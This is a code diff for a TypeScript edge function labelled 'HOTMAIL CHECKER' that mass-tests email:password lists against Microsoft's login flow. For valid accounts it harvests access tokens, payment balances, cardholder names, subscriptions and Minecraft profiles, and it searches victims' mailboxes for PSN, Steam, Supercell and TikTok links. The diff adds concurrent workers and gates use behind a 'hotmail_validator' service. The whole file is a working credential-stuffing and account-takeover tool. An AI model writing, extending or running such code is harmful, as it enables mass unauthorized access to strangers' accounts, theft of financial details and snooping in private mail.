@@ -46,11 +46,20 @@ class CookieJar {
   private cookies: Map<string, string> = new Map();
 
   extractFromHeaders(headers: Headers): void {
-    const setCookie = headers.get("set-cookie");
-    if (setCookie) {
-      const cookieStrings = setCookie.split(/,(?=\s*[^;,]+=[^;,]+)/);
-      for (const cookieStr of cookieStrings) {
-        this.parseCookie(cookieStr);
+    try {
+      // Use getSetCookie if available
+      const setCookies = (headers as any).getSetCookie?.() || [];
+      for (const cookie of setCookies) {
+        this.parseCookie(cookie);
+      }
+    } catch {
+      // Fallback to set-cookie header
+      const setCookie = headers.get("set-cookie");
+      if (setCookie) {
+        const cookieStrings = setCookie.split(/,(?=\s*[^;,]+=[^;,]+)/);
+        for (const cookieStr of cookieStrings) {
+          this.parseCookie(cookieStr);
+        }
       }
     }
   }
@@ -61,7 +70,7 @@ class CookieJar {
     if (eqIndex > 0) {
       const name = parts.substring(0, eqIndex).trim();
       const value = parts.substring(eqIndex + 1).trim();
-      if (name && value && !name.startsWith("__")) {
+      if (name && value) {
         this.cookies.set(name, value);
       }
     }
@@ -95,8 +104,8 @@ function formatDuration(ms: number): string {
   return `${minutes}m ${seconds}s`;
 }
 
-// Check Microsoft Subscriptions - simplified for speed
-async function checkMicrosoftSubscriptions(accessToken: string): Promise<{
+// Check Microsoft Subscriptions - follows Python logic exactly
+async function checkMicrosoftSubscriptions(session: CookieJar): Promise<{
   status: string;
   subscriptions: SubscriptionInfo[];
   data: Record<string, string>;
@@ -108,13 +117,17 @@ async function checkMicrosoftSubscriptions(accessToken: string): Promise<{
     
     const r = await fetch(paymentAuthUrl, {
       headers: {
+        "Host": "login.live.com",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Referer": "https://account.microsoft.com/"
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Referer": "https://account.microsoft.com/",
+        "Cookie": session.toString()
       },
       redirect: 'follow'
     });
     
+    session.extractFromHeaders(r.headers);
     const searchText = (await r.text()) + " " + r.url;
     
     const tokenPatterns = [/access_token=([^&\s"']+)/, /"access_token":"([^"]+)"/];
@@ -139,10 +152,30 @@ async function checkMicrosoftSubscriptions(accessToken: string): Promise<{
       "Accept": "application/json",
       "Authorization": `MSADELEGATE1.0="${paymentToken}"`,
       "Content-Type": "application/json",
+      "Host": "paymentinstruments.mp.microsoft.com",
+      "ms-cV": crypto.randomUUID(),
       "Origin": "https://account.microsoft.com",
       "Referer": "https://account.microsoft.com/"
     };
     
+    // Check for payment instruments and balance
+    try {
+      const paymentUrl = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US";
+      const rPay = await fetch(paymentUrl, { headers: paymentHeaders });
+      if (rPay.ok) {
+        const payText = await rPay.text();
+        const balanceMatch = payText.match(/"balance"\s*:\s*([0-9.]+)/);
+        if (balanceMatch) {
+          subData['balance'] = "$" + balanceMatch[1];
+        }
+        const cardMatch = payText.match(/"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"/s);
+        if (cardMatch) {
+          subData['card_holder'] = cardMatch[1];
+        }
+      }
+    } catch {}
+    
+    // Check transactions for subscriptions
     try {
       const transUrl = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions";
       const rSub = await fetch(transUrl, { headers: paymentHeaders });
@@ -154,13 +187,29 @@ async function checkMicrosoftSubscriptions(accessToken: string): Promise<{
           'Xbox Game Pass Ultimate': { type: 'GAME PASS ULTIMATE', category: 'gaming' },
           'PC Game Pass': { type: 'PC GAME PASS', category: 'gaming' },
           'Xbox Game Pass': { type: 'GAME PASS', category: 'gaming' },
+          'EA Play': { type: 'EA PLAY', category: 'gaming' },
           'Xbox Live Gold': { type: 'XBOX LIVE GOLD', category: 'gaming' },
-          'Microsoft 365': { type: 'M365', category: 'office' },
+          'Microsoft 365 Family': { type: 'M365 FAMILY', category: 'office' },
+          'Microsoft 365 Personal': { type: 'M365 PERSONAL', category: 'office' },
+          'Office 365': { type: 'OFFICE 365', category: 'office' },
+          'OneDrive': { type: 'ONEDRIVE', category: 'storage' },
         };
         
         for (const [keyword, info] of Object.entries(subscriptionKeywords)) {
           if (responseText.includes(keyword)) {
             const subInfo: SubscriptionInfo = { name: info.type, category: info.category };
+            
+            // Extract renewal date if present
+            const renewalMatch = responseText.match(/"nextRenewalDate"\s*:\s*"([^T"]+)/);
+            if (renewalMatch) {
+              subInfo.daysRemaining = renewalMatch[1];
+            }
+            
+            const autoMatch = responseText.match(/"autoRenew"\s*:\s*(true|false)/);
+            if (autoMatch) {
+              subInfo.autoRenew = autoMatch[1] === "true" ? "YES" : "NO";
+            }
+            
             subscriptions.push(subInfo);
           }
         }
@@ -182,6 +231,7 @@ async function checkMinecraft(accessToken: string): Promise<{
   status: string;
   username?: string;
   uuid?: string;
+  capes?: string[];
 }> {
   try {
     const r = await fetch('https://api.minecraftservices.com/minecraft/profile', {
@@ -196,7 +246,8 @@ async function checkMinecraft(accessToken: string): Promise<{
       return {
         status: "OWNED",
         username: data.name || "Unknown",
-        uuid: data.id || ""
+        uuid: data.id || "",
+        capes: (data.capes || []).map((c: any) => c.alias || '')
       };
     }
     
@@ -206,7 +257,7 @@ async function checkMinecraft(accessToken: string): Promise<{
   }
 }
 
-// Main account check function - follows Python logic
+// Main account check function - EXACT Python logic
 async function checkAccount(
   email: string, 
   password: string, 
@@ -225,16 +276,30 @@ async function checkAccount(
   const cookies = new CookieJar();
   
   try {
-    // Step 1: Check if MSAccount
+    // Step 1: Check if MSAccount (following Python exactly)
+    console.log(`[${threadId}] Step 1: Checking account type for ${email}`);
     const idpUrl = `https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=${encodeURIComponent(email)}`;
     const idpRes = await fetch(idpUrl, {
       headers: {
         "X-OneAuth-AppName": "Outlook Lite",
+        "X-Office-Version": "3.11.0-minApi24",
+        "X-CorrelationId": crypto.randomUUID(),
         "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
+        "Host": "odc.officeapps.live.com",
+        "Connection": "Keep-Alive",
+        "Accept-Encoding": "gzip"
       }
     });
     
     const idpText = await idpRes.text();
+    
+    // Python logic: check for bad account types
+    if (idpText.includes("Neither") || idpText.includes("Both") || 
+        idpText.includes("Placeholder") || idpText.includes("OrgId")) {
+      result.status = "invalid";
+      result.checkDuration = Date.now() - startTime;
+      return result;
+    }
     
     if (!idpText.includes("MSAccount")) {
       result.status = "invalid";
@@ -242,15 +307,18 @@ async function checkAccount(
       return result;
     }
     
-    await new Promise(r => setTimeout(r, 200));
+    await new Promise(r => setTimeout(r, 300));
     
-    // Step 2: Get auth page
+    // Step 2: Get auth page (following Python exactly)
+    console.log(`[${threadId}] Step 2: Getting auth page`);
     const authUrl = `https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=${encodeURIComponent(email)}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D`;
     
     const authRes = await fetch(authUrl, {
       headers: {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Connection": "keep-alive"
       },
       redirect: 'follow'
     });
@@ -259,11 +327,14 @@ async function checkAccount(
     const authText = await authRes.text();
     const authFinalUrl = authRes.url;
     
+    // Extract urlPost and PPFT (Python regex patterns)
     const urlMatch = authText.match(/urlPost":"([^"]+)"/);
     const ppftMatch = authText.match(/name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"/);
     
     if (!urlMatch || !ppftMatch) {
+      console.log(`[${threadId}] Failed to extract urlPost or PPFT`);
       result.status = "error";
+      result.error = "Could not extract auth parameters";
       result.checkDuration = Date.now() - startTime;
       return result;
     }
@@ -271,14 +342,16 @@ async function checkAccount(
     const postUrl = urlMatch[1].replace(/\\\//g, "/");
     const ppft = ppftMatch[1];
     
-    // Step 3: Login
-    const loginData = `i13=1&login=${encodeURIComponent(email)}&loginfmt=${encodeURIComponent(email)}&type=11&LoginOptions=1&passwd=${encodeURIComponent(password)}&ps=2&PPFT=${encodeURIComponent(ppft)}&PPSX=PassportR&NewUser=1&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0`;
+    // Step 3: Login (following Python exactly)
+    console.log(`[${threadId}] Step 3: Submitting credentials`);
+    const loginData = `i13=1&login=${encodeURIComponent(email)}&loginfmt=${encodeURIComponent(email)}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${encodeURIComponent(password)}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${encodeURIComponent(ppft)}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960`;
     
     const loginRes = await fetch(postUrl, {
       method: "POST",
       headers: {
         "Content-Type": "application/x-www-form-urlencoded",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Origin": "https://login.live.com",
         "Referer": authFinalUrl,
         "Cookie": cookies.toString()
@@ -288,27 +361,45 @@ async function checkAccount(
     
     cookies.extractFromHeaders(loginRes.headers);
     const loginText = await loginRes.text();
-    const loginLocation = loginRes.headers.get("location") || "";
+    const loginTextLower = loginText.toLowerCase();
+    const location = loginRes.headers.get("location") || "";
     
-    if (loginText.includes("account or password is incorrect")) {
+    // Check for errors (following Python exactly)
+    if (loginTextLower.includes("account or password is incorrect") || loginText.split("error").length > 1) {
       result.status = "invalid";
       result.checkDuration = Date.now() - startTime;
       return result;
     }
     
-    if (loginText.includes("identity/confirm")) {
+    // Check for 2FA/consent (following Python exactly)
+    if (loginText.includes("https://account.live.com/identity/confirm") || 
+        loginTextLower.includes("identity/confirm")) {
       result.status = "2fa";
       result.checkDuration = Date.now() - startTime;
       return result;
     }
     
-    if (loginText.includes("account.live.com/Abuse")) {
+    if (loginText.includes("https://account.live.com/Consent") || 
+        loginTextLower.includes("consent")) {
+      result.status = "2fa";
+      result.checkDuration = Date.now() - startTime;
+      return result;
+    }
+    
+    if (loginText.includes("https://account.live.com/Abuse")) {
       result.status = "locked";
       result.checkDuration = Date.now() - startTime;
       return result;
     }
     
-    const codeMatch = loginLocation.match(/code=([^&]+)/);
+    // Check for authorization code
+    if (!location) {
+      result.status = "invalid";
+      result.checkDuration = Date.now() - startTime;
+      return result;
+    }
+    
+    const codeMatch = location.match(/code=([^&]+)/);
     if (!codeMatch) {
       result.status = "invalid";
       result.checkDuration = Date.now() - startTime;
@@ -319,6 +410,7 @@ async function checkAccount(
     const mspcid = cookies.get("MSPCID");
     if (!mspcid) {
       result.status = "error";
+      result.error = "No MSPCID cookie";
       result.checkDuration = Date.now() - startTime;
       return result;
     }
@@ -326,6 +418,7 @@ async function checkAccount(
     const cid = mspcid.toUpperCase();
     
     // Step 4: Get access token
+    console.log(`[${threadId}] Step 4: Getting access token`);
     const tokenData = `client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=${code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access`;
     
     const tokenRes = await fetch("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", {
@@ -338,32 +431,55 @@ async function checkAccount(
     
     if (!tokenJson.access_token) {
       result.status = "error";
+      result.error = "No access token received";
       result.checkDuration = Date.now() - startTime;
       return result;
     }
     
     const accessToken = tokenJson.access_token;
     result.status = "valid";
+    console.log(`[${threadId}] ✓ Valid account: ${email}`);
     
-    // Check subscriptions if requested
-    if (checkMode === "microsoft" || checkMode === "all") {
+    // Get profile info
+    try {
+      const profileRes = await fetch("https://substrate.office.com/profileb2/v2.0/me/V1Profile", {
+        headers: {
+          "User-Agent": "Outlook-Android/2.0",
+          "Authorization": `Bearer ${accessToken}`,
+          "X-AnchorMailbox": `CID:${cid}`
+        }
+      });
+      if (profileRes.ok) {
+        const profile = await profileRes.json();
+        if (profile.accounts?.[0]?.location) {
+          result.country = profile.accounts[0].location;
+        }
+        if (profile.displayName) {
+          result.name = profile.displayName;
+        }
+      }
+    } catch {}
+    
+    // Check Microsoft subscriptions if requested
+    if (checkMode === "microsoft" || checkMode === "all" || checkMode === "both") {
       try {
-        const msResult = await checkMicrosoftSubscriptions(accessToken);
+        const msResult = await checkMicrosoftSubscriptions(cookies);
         result.msStatus = msResult.status;
         result.subscriptions = msResult.subscriptions;
+        if (msResult.data.balance) result.balance = msResult.data.balance;
       } catch {}
     }
     
     // Check Minecraft if requested
-    if (checkMode === "minecraft" || checkMode === "all") {
+    if (checkMode === "minecraft" || checkMode === "all" || checkMode === "both") {
       try {
         const mcResult = await checkMinecraft(accessToken);
         result.minecraft = mcResult;
       } catch {}
     }
     
-    // Check PSN via email search (following Python logic exactly)
-    if (checkMode === "psn" || checkMode === "all") {
+    // Check PSN via email search (following Python logic)
+    if (checkMode === "psn" || checkMode === "all" || checkMode === "both") {
       try {
         const psnPayload = {
           "Cvid": crypto.randomUUID(),
@@ -401,8 +517,8 @@ async function checkAccount(
       } catch {}
     }
     
-    // Check Steam via email search (following Python logic)
-    if (checkMode === "steam" || checkMode === "all") {
+    // Check Steam via email search
+    if (checkMode === "steam" || checkMode === "all" || checkMode === "both") {
       try {
         const steamPayload = {
           "Cvid": crypto.randomUUID(),
@@ -440,8 +556,8 @@ async function checkAccount(
       } catch {}
     }
     
-    // Check Supercell via email search (following Python logic)
-    if (checkMode === "supercell" || checkMode === "all") {
+    // Check Supercell via email search
+    if (checkMode === "supercell" || checkMode === "all" || checkMode === "both") {
       try {
         const scPayload = {
           "Cvid": crypto.randomUUID(),
@@ -480,9 +596,9 @@ async function checkAccount(
             const results = scData.EntitySets?.[0]?.ResultSets?.[0]?.Results || [];
             for (const r of results) {
               const preview = r.Preview || '';
-              if (preview.includes('Clash Royale') && !games.includes('Clash Royale')) games.push('Clash Royale');
-              if (preview.includes('Clash of Clans') && !games.includes('Clash of Clans')) games.push('Clash of Clans');
-              if (preview.includes('Brawl Stars') && !games.includes('Brawl Stars')) games.push('Brawl Stars');
+              if ((preview.includes('Clash Royale') || preview.includes('Royale')) && !games.includes('Clash Royale')) games.push('Clash Royale');
+              if ((preview.includes('Clash of Clans') || preview.includes('Clans')) && !games.includes('Clash of Clans')) games.push('Clash of Clans');
+              if ((preview.includes('Brawl Stars') || preview.includes('Brawl')) && !games.includes('Brawl Stars')) games.push('Brawl Stars');
               if (preview.includes('Hay Day') && !games.includes('Hay Day')) games.push('Hay Day');
             }
           }
@@ -492,8 +608,8 @@ async function checkAccount(
       } catch {}
     }
     
-    // Check TikTok via email search (following Python logic)
-    if (checkMode === "tiktok" || checkMode === "all") {
+    // Check TikTok via email search
+    if (checkMode === "tiktok" || checkMode === "all" || checkMode === "both") {
       try {
         const ttPayload = {
           "Cvid": crypto.randomUUID(),
@@ -532,8 +648,7 @@ async function checkAccount(
             const results = ttData.EntitySets?.[0]?.ResultSets?.[0]?.Results || [];
             for (const r of results) {
               const preview = r.Preview || '';
-              // Try to extract username from greeting patterns
-              const patterns = [/Salut\s+([^,]+)/, /Hallo\s+([^,]+)/, /Hi\s+([^,]+)/, /Hello\s+([^,]+)/];
+              const patterns = [/Salut\s+([^,]+)/, /Hallo\s+([^,]+)/, /Xin chào\s+([^,]+)/, /Hi\s+([^,]+)/, /Hello\s+([^,]+)/];
               for (const pattern of patterns) {
                 const match = preview.match(pattern);
                 if (match) {
@@ -554,6 +669,7 @@ async function checkAccount(
     return result;
     
   } catch (e) {
+    console.error(`[${threadId}] Error checking ${email}:`, e);
     result.status = "error";
     result.error = String(e);
     result.checkDuration = Date.now() - startTime;
@@ -608,7 +724,7 @@ function buildHitMessage(result: CheckResult): string {
   return parts.join(' | ');
 }
 
-// Process accounts in background
+// Process accounts in background with concurrency support
 async function processAccountsBackground(
   accounts: string[],
   checkMode: string,
@@ -630,93 +746,115 @@ async function processAccountsBackground(
     error: 0,
     msPremium: 0,
     minecraftHits: 0,
-    psnHits: 0
+    psnHits: 0,
+    steamHits: 0,
+    supercellHits: 0,
+    tiktokHits: 0
   };
   
-  console.log(`${getCanaryTimestamp()} Background processing ${total} accounts...`);
+  console.log(`${getCanaryTimestamp()} ═══════════════════════════════════════════════`);
+  console.log(`${getCanaryTimestamp()} HOTMAIL CHECKER - Processing ${total} accounts`);
+  console.log(`${getCanaryTimestamp()} Mode: ${checkMode} | Threads: ${threads}`);
   
-  // Process one at a time to avoid CPU spikes
-  for (let i = 0; i < accounts.length; i++) {
-    const account = accounts[i];
-    const [email, ...passParts] = account.split(":");
-    const password = passParts.join(":");
-    
-    // Broadcast checking status
-    await broadcastProgress(sessionId, {
-      index: i + 1,
-      total,
-      email: email || account,
-      password: password || '',
-      status: 'checking',
-      message: '⟳ Checking...',
-      timestamp: Date.now()
-    }).catch(() => {});
-    
-    if (!email || !password) {
+  let currentIndex = 0;
+  const processedResults: (CheckResult | null)[] = new Array(accounts.length).fill(null);
+  
+  // Worker function
+  async function worker(workerId: number): Promise<void> {
+    while (true) {
+      const idx = currentIndex++;
+      if (idx >= accounts.length) break;
+      
+      const account = accounts[idx];
+      const [email, ...passParts] = account.split(":");
+      const password = passParts.join(":");
+      
+      // Broadcast checking status
       await broadcastProgress(sessionId, {
-        index: i + 1,
+        index: idx + 1,
         total,
-        email: account,
-        password: '',
-        status: 'failed',
-        message: '✗ Invalid format',
-        timestamp: Date.now()
-      }).catch(() => {});
-      stats.error++;
-      continue;
-    }
-    
-    try {
-      const result = await checkAccount(email.trim(), password.trim(), checkMode, 1);
-      results.push(result);
-      
-      // Update stats
-      if (result.status === "valid") stats.valid++;
-      else if (result.status === "invalid") stats.invalid++;
-      else if (result.status === "2fa") stats.twoFa++;
-      else if (result.status === "locked") stats.locked++;
-      else stats.error++;
-      
-      if (result.msStatus === "PREMIUM") stats.msPremium++;
-      if (result.minecraft?.status === "OWNED") stats.minecraftHits++;
-      if (result.psn?.status === "HAS_ORDERS") stats.psnHits++;
-      
-      // Broadcast result
-      await broadcastProgress(sessionId, {
-        index: i + 1,
-        total,
-        email,
-        password: password.trim(),
-        status: result.status as any,
-        message: buildHitMessage(result),
+        email: email || account,
+        password: password || '',
+        status: 'checking',
+        message: `⟳ Checking... [Thread ${workerId}]`,
         timestamp: Date.now()
       }).catch(() => {});
       
-      // Log progress every 10 accounts
-      if ((i + 1) % 10 === 0 || i + 1 === total) {
-        console.log(`${getCanaryTimestamp()} Progress: ${i + 1}/${total} | Valid: ${stats.valid} | Invalid: ${stats.invalid}`);
+      if (!email || !password) {
+        await broadcastProgress(sessionId, {
+          index: idx + 1,
+          total,
+          email: account,
+          password: '',
+          status: 'failed',
+          message: '✗ Invalid format',
+          timestamp: Date.now()
+        }).catch(() => {});
+        stats.error++;
+        continue;
       }
       
-    } catch (e) {
-      stats.error++;
-      await broadcastProgress(sessionId, {
-        index: i + 1,
-        total,
-        email,
-        password: password || '',
-        status: 'error',
-        message: `! Error: ${String(e).substring(0, 50)}`,
-        timestamp: Date.now()
-      }).catch(() => {});
+      try {
+        const result = await checkAccount(email.trim(), password.trim(), checkMode, workerId);
+        processedResults[idx] = result;
+        results.push(result);
+        
+        // Update stats
+        if (result.status === "valid") stats.valid++;
+        else if (result.status === "invalid") stats.invalid++;
+        else if (result.status === "2fa") stats.twoFa++;
+        else if (result.status === "locked") stats.locked++;
+        else stats.error++;
+        
+        if (result.msStatus === "PREMIUM") stats.msPremium++;
+        if (result.minecraft?.status === "OWNED") stats.minecraftHits++;
+        if (result.psn?.status === "HAS_ORDERS") stats.psnHits++;
+        if (result.steam?.status === "HAS_PURCHASES") stats.steamHits++;
+        if (result.supercell?.status === "LINKED") stats.supercellHits++;
+        if (result.tiktok?.status === "LINKED") stats.tiktokHits++;
+        
+        // Broadcast result
+        await broadcastProgress(sessionId, {
+          index: idx + 1,
+          total,
+          email,
+          password: password.trim(),
+          status: result.status as any,
+          message: buildHitMessage(result),
+          timestamp: Date.now()
+        }).catch(() => {});
+        
+      } catch (e) {
+        stats.error++;
+        await broadcastProgress(sessionId, {
+          index: idx + 1,
+          total,
+          email,
+          password: password || '',
+          status: 'error',
+          message: `! Error: ${String(e).substring(0, 50)}`,
+          timestamp: Date.now()
+        }).catch(() => {});
+      }
+      
+      // Small delay to avoid rate limiting
+      await new Promise(r => setTimeout(r, 100));
     }
-    
-    // Small delay between accounts to avoid rate limiting
-    await new Promise(r => setTimeout(r, 100));
   }
+  
+  // Start workers
+  const workers: Promise<void>[] = [];
+  const actualThreads = Math.min(threads, accounts.length, 10); // Cap at 10 concurrent
+  for (let i = 0; i < actualThreads; i++) {
+    workers.push(worker(i + 1));
+  }
+  
+  await Promise.all(workers);
   
   const duration = formatDuration(Date.now() - startTime);
   console.log(`${getCanaryTimestamp()} ═══════════════════════════════════════════════`);
-  console.log(`${getCanaryTimestamp()} COMPLETE | Duration: ${duration} | Valid: ${stats.valid}/${total}`);
+  console.log(`${getCanaryTimestamp()} COMPLETE | Duration: ${duration}`);
+  console.log(`${getCanaryTimestamp()} Valid: ${stats.valid} | Invalid: ${stats.invalid} | 2FA: ${stats.twoFa}`);
   
   // Broadcast completion
   await broadcastProgress(sessionId, {
@@ -761,16 +899,18 @@ serve(async (req) => {
       }
     }
 
+    const body = await req.json();
     const { 
       accounts, 
       checkMode = "all", 
       threads = 5, 
       sessionId = null
-    } = await req.json();
+    } = body;
 
     console.log(`${getCanaryTimestamp()} ═══════════════════════════════════════════════`);
-    console.log(`${getCanaryTimestamp()} HOTMAIL CHECKER - BACKGROUND MODE`);
-    console.log(`${getCanaryTimestamp()} User: ${userEmail || 'Anonymous'} | Accounts: ${accounts?.length || 0} | Mode: ${checkMode}`);
+    console.log(`${getCanaryTimestamp()} HOTMAIL CHECKER REQUEST`);
+    console.log(`${getCanaryTimestamp()} User: ${userEmail || userId || 'Anonymous'}`);
+    console.log(`${getCanaryTimestamp()} Accounts: ${accounts?.length || 0} | Mode: ${checkMode} | Threads: ${threads}`);
 
     if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
       return new Response(
@@ -779,6 +919,7 @@ serve(async (req) => {
       );
     }
 
+    // Check user access
     if (userId) {
       const userData = await firebaseGet<{ services?: string[]; isAdmin?: boolean }>(`users/${userId}`);
       const hasAccess = userData?.services?.includes("hotmail_validator") || 
@@ -795,7 +936,7 @@ serve(async (req) => {
 
     const jobSessionId = sessionId || `job-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
     
-    // Start background processing - DON'T AWAIT
+    // Start background processing
     EdgeRuntime.waitUntil(
       processAccountsBackground(accounts, checkMode, threads, jobSessionId, userId, userEmail)
         .catch(error => {
